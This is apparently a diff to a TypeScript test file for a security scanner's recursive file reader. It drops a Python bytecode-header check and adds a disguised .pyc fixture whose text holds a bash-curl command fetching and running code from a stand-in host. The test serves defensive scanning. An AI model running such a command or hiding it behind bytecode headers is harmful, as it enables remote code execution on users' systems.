@@ -11,12 +11,7 @@ import {
 import { join, sep } from "path";
 import { tmpdir } from "os";
 import { spawnSync } from "child_process";
-import {
-  hasPythonBytecodeHeader,
-  isPathInside,
-  readBoundedTextFile,
-  readFilesRecursive,
-} from "./fs";
+import { isPathInside, readBoundedTextFile, readFilesRecursive } from "./fs";
 import type { ExternalSymlink } from "./types";
 
 describe("isPathInside", () => {
@@ -302,6 +297,16 @@ describe("readFilesRecursive binary files (#809)", () => {
         0x03, 0xf3, 0x0d, 0x0a, 1, 2, 3, 4, 0x63, 0, 0, 0, 0, 1, 2, 3,
       ]),
     );
+    // A valid CPython 3.14 header (magic `2b 0e 0d 0a`, zero flags) is
+    // no proof of bytecode: bash and node still run the text after it.
+    await writeFile(
+      join(dir, "scripts", "polyglot.pyc"),
+      Buffer.concat([
+        Buffer.from([0x2b, 0x0e, 0x0d, 0x0a, 0, 0, 0, 0]),
+        Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 0xe3]),
+        Buffer.from('\nbash -c "$(curl https://x.test/p)"\n'),
+      ]),
+    );
     // Source text under a bytecode name: `python3 x.pyo` and
     // `runpy.run_path("x.pyc")` run it, so it is scanned.
     await writeFile(join(dir, "scripts", "legacy.pyo"), "eval(x)\n");
@@ -328,7 +333,7 @@ describe("readFilesRecursive binary files (#809)", () => {
     await rm(dir, { recursive: true, force: true });
   });
 
-  test("skips real .pyc/.pyo bytecode only; NUL-byte files are still read", async () => {
+  test("reads .pyc/.pyo as text, bytecode header or not, and NUL-byte files", async () => {
     const paths = (await readFilesRecursive(dir)).map((f) => f.relPath).sort();
     expect(paths).toEqual([
       "blob.dat",
@@ -336,25 +341,21 @@ describe("readFilesRecursive binary files (#809)", () => {
       "noext",
       "run",
       "scripts/__pycache__/evil.py",
+      "scripts/__pycache__/render.cpython-312.pyc",
       "scripts/fake.pyc",
       "scripts/legacy.pyo",
+      "scripts/old.pyo",
       "scripts/payload.pyc",
+      "scripts/polyglot.pyc",
       "scripts/render.py",
     ]);
   });
 
-  test("hasPythonBytecodeHeader needs the magic's \\r\\n and a NUL in the header", () => {
-    const pyc = Buffer.from([
-      0xcb, 0x0d, 0x0d, 0x0a, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8,
-    ]);
-    expect(hasPythonBytecodeHeader(pyc)).toBe(true);
-    expect(hasPythonBytecodeHeader(pyc.subarray(0, 15))).toBe(false);
-    expect(
-      hasPythonBytecodeHeader(Buffer.from("#a\r\nprint('RAN')  # pad\n")),
-    ).toBe(false);
-    const noCrLf = Buffer.from(pyc);
-    noCrLf[2] = 0x20;
-    expect(hasPythonBytecodeHeader(noCrLf)).toBe(false);
+  test("a .pyc polyglot behind a valid 3.14 header is read", async () => {
+    const files = await readFilesRecursive(dir);
+    const poly = files.find((f) => f.relPath === "scripts/polyglot.pyc");
+    expect(poly).toBeDefined();
+    expect(poly!.content).toContain('bash -c "$(curl https://x.test/p)"');
   });
 
   test("confined mode applies the same rule", async () => {
@@ -365,8 +366,9 @@ describe("readFilesRecursive binary files (#809)", () => {
       .sort();
     expect(paths).toContain("hidden.js");
     expect(paths).toContain("blob.dat");
-    expect(paths).not.toContain("scripts/__pycache__/render.cpython-312.pyc");
-    expect(paths).not.toContain("scripts/old.pyo");
+    expect(paths).toContain("scripts/__pycache__/render.cpython-312.pyc");
+    expect(paths).toContain("scripts/old.pyo");
+    expect(paths).toContain("scripts/polyglot.pyc");
     expect(paths).toContain("scripts/legacy.pyo");
   });
 });
